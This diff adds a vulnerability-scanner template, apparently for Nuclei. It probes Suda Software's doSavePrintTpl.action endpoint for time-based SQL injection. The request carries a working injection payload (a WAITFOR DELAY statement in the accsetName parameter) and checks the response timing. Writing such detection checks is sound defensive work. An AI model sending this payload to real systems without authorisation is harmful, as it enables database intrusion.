@@ -1,0 +1,37 @@
+id: suda-software-dosaveprinttpl-sqli
+info:
+  name: Suda Software doSavePrintTpl SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL injection vulnerability in Suda Software's doSavePrintTpl functionality, which could be exploited by attackers to execute arbitrary SQL commands.
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=1&accsetName=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--&modId=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "WAITFOR DELAY"
+        negative: false
+      - type: regex
+        part: header
+        regex:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
